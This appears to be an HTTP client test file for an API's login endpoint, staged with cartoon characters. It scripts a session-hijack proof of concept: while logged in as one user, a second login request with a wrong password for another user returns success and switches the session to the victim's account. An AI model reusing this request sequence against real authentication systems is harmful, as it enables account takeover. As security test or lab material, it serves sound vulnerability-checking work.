# @import ../common/setup.http
@host = {{base_host}}/v205


### Plankton logs in normally
POST /auth/login
Content-Type: application/json

{
    "email": "plankton@chum-bucket.sea",
    "password": "i_love_my_wife"
}

@session = {{refreshCookie(response)}}


### Plankton confirms his identity
GET /account/info
Cookie: {{session}}

@session = {{refreshCookie(response, session)}}
?? body email == plankton@chum-bucket.sea


### --- EXPLOIT: While already logged in as Plankton, send another login request for SpongeBob ---
POST /auth/login
Cookie: {{session}}
Content-Type: application/json

{
    "email": "spongebob@krusty-krab.sea",
    "password": "wrong_password"
}

@session = {{refreshCookie(response, session)}}
?? status == 200
?? body message == Login successful


### Check identity: SESSION HIJACKED!
GET /account/info
Cookie: {{session}}

?? body email == spongebob@krusty-krab.sea

{{
  console.info("SESSION HIJACKED! Now acting as:", response.parsedBody.email);
}}
